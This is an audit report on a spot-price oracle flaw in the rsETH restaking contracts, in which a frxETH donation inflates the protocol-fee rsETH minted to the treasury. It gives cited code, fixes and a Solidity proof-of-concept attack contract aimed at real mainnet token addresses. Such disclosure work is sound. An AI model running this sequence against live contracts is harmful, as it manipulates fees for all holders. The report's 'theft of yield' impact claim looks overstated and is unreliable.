### Title
Spot `pricePerShare()` Oracle Enables frxETH Donation to Inflate Protocol Fee and Steal Unclaimed Yield — (`contracts/oracles/SfrxETHPriceOracle.sol`, `contracts/LRTOracle.sol`)

---

### Summary

`SfrxETHPriceOracle.getAssetPrice()` reads sfrxETH's `pricePerShare()` as a raw spot value with no TWAP or manipulation guard. Because sfrxETH is an ERC4626 vault whose `totalAssets()` equals its frxETH balance, any direct frxETH transfer to the vault inflates `pricePerShare()` in the same transaction. `LRTOracle.updateRSETHPrice()` is a public, permissionless function that uses this spot price to compute `rewardAmount` and mint protocol-fee rsETH to the treasury. An attacker can therefore inflate the fee rsETH minted to the treasury, diluting all existing rsETH holders' unclaimed yield.

---

### Finding Description

**Oracle reads spot price with no manipulation protection**

`SfrxETHPriceOracle.getAssetPrice()` delegates entirely to `pricePerShare()`: [1](#0-0) 

There is no TWAP, no deviation check, and no secondary source. `pricePerShare()` in sfrxETH equals `totalAssets() / totalSupply()`. A direct ERC20 transfer of frxETH to the sfrxETH contract increases `totalAssets()` without minting new shares, immediately inflating `pricePerShare()`.

**`updateRSETHPrice()` is public and uses the spot price for fee computation** [2](#0-1) 

Inside `_updateRsETHPrice()`, `totalETHInProtocol` is computed by multiplying the protocol's sfrxETH token balance by the spot `pricePerShare()`: [3](#0-2) 

`getTotalAssetDeposits(sfrxETH)` sums `IERC20(sfrxETH).balanceOf(depositPool)`, NDC balances, EigenLayer strategy balances, and unstaking vault balances: [4](#0-3) 

So `totalETHInProtocol` for sfrxETH = `totalProtocolSfrxETHShares × inflated_pricePerShare`. The inflated `rewardAmount` drives an inflated `protocolFeeInETH`, and excess rsETH is minted to the treasury: [5](#0-4) 

**`pricePercentageLimit` guard is bypassable**

The threshold check is: [6](#0-5) 

If `pricePercentageLimit == 0` the entire check is skipped. Even when non-zero, the attacker can calibrate the donation to keep the rsETH price increase within the allowed band (since the fee is deducted before computing the new rsETH price, the rsETH price rise is smaller than the raw TVL inflation).

**`maxFeeMintAmountPerDay` limits but does not prevent the attack** [7](#0-6) 

This caps per-day damage but does not prevent the attack. An attacker can repeat the sequence each day up to the daily cap, or perform a single large donation that consumes the entire daily allowance in one call.

---

### Impact Explanation

Every excess rsETH minted to the treasury as protocol fee dilutes the rsETH/ETH exchange rate for all existing holders. Yield that should have accrued to rsETH holders is instead captured by the treasury as an over-stated fee. This is a direct, quantifiable theft of unclaimed yield proportional to the donation size and the protocol's sfrxETH holdings.

---

### Likelihood Explanation

- sfrxETH is a listed supported asset with non-zero protocol balance.
- `updateRSETHPrice()` requires no role — any EOA can call it.
- frxETH is freely purchasable on-chain; the attacker only needs enough to move `pricePerShare()` by a meaningful amount.
- The attack is atomic (deposit → donate → call oracle → redeem) and requires no privileged access.
- If `pricePercentageLimit == 0` (or is set generously), there is no on-chain revert path for an unprivileged caller.
- The attacker recovers most of the donated frxETH by redeeming their sfrxETH shares; the net cost is only the fraction of the donation that accrues to other sfrxETH holders.

---

### Recommendation

1. **Replace the spot oracle with a manipulation-resistant price source.** Use a Chainlink frxETH/ETH feed or a TWAP-based oracle instead of reading `pricePerShare()` directly.
2. **If `pricePerShare()` must be used**, enforce a maximum per-update price increase relative to the last recorded value (e.g., cap the sfrxETH price used in fee computation at `lastRecordedPricePerShare * (1 + maxDailyYield)`).
3. **Ensure `pricePercentageLimit` is always non-zero** in production so that large single-block price jumps revert for unprivileged callers.
4. **Consider restricting `updateRSETHPrice()` to a keeper/manager role** or adding a cooldown between successive calls.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

// Fork test — run against mainnet fork
// Preconditions:
//   - sfrxETH is a supported asset with non-zero balance in the protocol
//   - pricePercentageLimit == 0 (or donation is small enough to stay within limit)
//   - maxFeeMintAmountPerDay > 0

interface ISfrxETH {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function balanceOf(address) external view returns (uint256);
    function pricePerShare() external view returns (uint256);
}

interface IFrxETH {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface ILRTOracle {
    function updateRSETHPrice() external;
}

interface IRSETH {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

contract DonationAttackPoC {
    ISfrxETH constant sfrxETH = ISfrxETH(0xac3E018457B222d93114458476f3E3416Abbe38F);
    IFrxETH  constant frxETH  = IFrxETH(0x5E8422345238F34275888049021821E8E08CAa1f);
    ILRTOracle lrtOracle;
    IRSETH rsETH;
    address treasury;

    constructor(address _lrtOracle, address _rsETH, address _treasury) {
        lrtOracle = ILRTOracle(_lrtOracle);
        rsETH     = IRSETH(_rsETH);
        treasury  = _treasury;
    }

    function attack(uint256 donationAmount) external {
        // 1. Acquire sfrxETH shares to recover most of the donation later
        frxETH.approve(address(sfrxETH), donationAmount);
        uint256 shares = sfrxETH.deposit(donationAmount / 2, address(this));

        // 2. Record baseline treasury rsETH balance
        uint256 treasuryBefore = rsETH.balanceOf(treasury);
        uint256 supplyBefore   = rsETH.totalSupply();

        // 3. Donate frxETH directly to sfrxETH vault — inflates pricePerShare()
        frxETH.transfer(address(sfrxETH), donationAmount / 2);

        // 4. Trigger fee minting with inflated TVL
        lrtOracle.updateRSETHPrice();

        // 5. Assert excess fee was minted
        uint256 excessFee = rsETH.balanceOf(treasury) - treasuryBefore;
        require(excessFee > 0, "No excess fee minted");

        // 6. Recover most frxETH
        sfrxETH.redeem(shares, address(this), address(this));

        // Attacker's net cost: donationAmount/2 * (1 - attackerShares/totalShares)
        // Treasury received: excessFee rsETH, diluting all existing holders
    }
}
```

The test should assert that `excessFee > protocolFeeInBPS/10_000 * genuine_yield_since_last_update`, confirming the invariant is broken.

### Citations

**File:** contracts/oracles/SfrxETHPriceOracle.sol (L35-41)
```text
    function getAssetPrice(address asset) external view returns (uint256) {
        if (asset != sfrxETHContractAddress) {
            revert InvalidAsset();
        }

        return ISfrxETH(sfrxETHContractAddress).pricePerShare();
    }
```

**File:** contracts/LRTOracle.sol (L87-89)
```text
    function updateRSETHPrice() public whenNotPaused {
        _updateRsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L205-209)
```text
        if (currentPeriodMintedFeeAmount + feeAmount > maxFeeMintAmountPerDay) {
            revert DailyFeeMintLimitExceeded(currentPeriodMintedFeeAmount + feeAmount, maxFeeMintAmountPerDay);
        }

        currentPeriodMintedFeeAmount += feeAmount;
```

**File:** contracts/LRTOracle.sol (L231-246)
```text
        uint256 totalETHInProtocol = _getTotalEthInProtocol();

        // calculate previousTVL using rsethSupply multiplied by rsETHPrice
        uint256 previousTVL = rsethSupply.mulWad(rsETHPrice);

        IPausable lrtDepositPool = IPausable(lrtConfig.getContract(LRTConstants.LRT_DEPOSIT_POOL));
        IPausable withdrawalManager = IPausable(lrtConfig.getContract(LRTConstants.LRT_WITHDRAW_MANAGER));

        // determine if the protocol is active (not paused)
        bool protocolPaused = lrtDepositPool.paused() || withdrawalManager.paused() || paused;

        // only take fee if TVL increased and protocol is not paused
        uint256 protocolFeeInETH = 0;
        if (!protocolPaused && totalETHInProtocol > previousTVL) {
            uint256 rewardAmount = totalETHInProtocol - previousTVL;
            protocolFeeInETH = (rewardAmount * lrtConfig.protocolFeeInBPS()) / 10_000;
```

**File:** contracts/LRTOracle.sol (L256-266)
```text
            bool isPriceIncreaseOffLimit =
                pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);

            // check if the price difference is above the threshold
            if (isPriceIncreaseOffLimit) {
                // if sender has a manager role, this doesn't revert.
                // if not, it reverts as price went above the threshold
                if (!IAccessControl(address(lrtConfig)).hasRole(LRTConstants.MANAGER, msg.sender)) {
                    revert PriceAboveDailyThreshold();
                }
            }
```

**File:** contracts/LRTOracle.sol (L299-308)
```text
        if (protocolFeeInETH > 0) {
            // Calculate rsETH amount to mint as protocol fee
            uint256 rsethAmountToMintAsProtocolFee = protocolFeeInETH.divWad(newRsETHPrice);

            _checkAndUpdateDailyFeeMintLimit(rsethAmountToMintAsProtocolFee);
            if (rsethAmountToMintAsProtocolFee > 0) {
                address treasury = lrtConfig.getContract(LRTConstants.PROTOCOL_TREASURY);
                IRSETH(rsETHTokenAddress).mint(treasury, rsethAmountToMintAsProtocolFee);
                emit FeeMinted(treasury, rsethAmountToMintAsProtocolFee);
            }
```

**File:** contracts/LRTDepositPool.sol (L385-397)
```text
    function getTotalAssetDeposits(address asset) public view override returns (uint256 totalAssetDeposit) {
        (
            uint256 assetLyingInDepositPool,
            uint256 assetLyingInNDCs,
            uint256 assetStakedInEigenLayer,
            uint256 assetUnstakingFromEigenLayer,
            uint256 assetLyingInConverter,
            uint256 assetLyingUnstakingVault
        ) = getAssetDistributionData(asset);
        uint256 effectiveAssetWithEigenLayer = assetStakedInEigenLayer + assetUnstakingFromEigenLayer;
        return (assetLyingInDepositPool + assetLyingInNDCs + effectiveAssetWithEigenLayer + assetLyingInConverter
                + assetLyingUnstakingVault);
    }
```
